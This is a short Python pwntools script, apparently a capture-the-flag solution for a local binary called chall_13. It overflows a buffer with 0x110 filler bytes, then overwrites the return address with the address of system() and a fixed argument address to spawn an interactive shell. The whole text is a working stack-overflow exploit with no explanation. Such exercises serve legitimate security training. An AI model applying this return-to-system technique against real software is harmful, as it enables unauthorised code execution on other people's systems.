from pwn import *
p=process("./chall_13")
elf=ELF("./chall_13")
payload = b"A" * 0x110 + p32(elf.sym.system) + b"JUNK" + p32(0x0804a019) 
p.sendline(payload)
p.interactive()
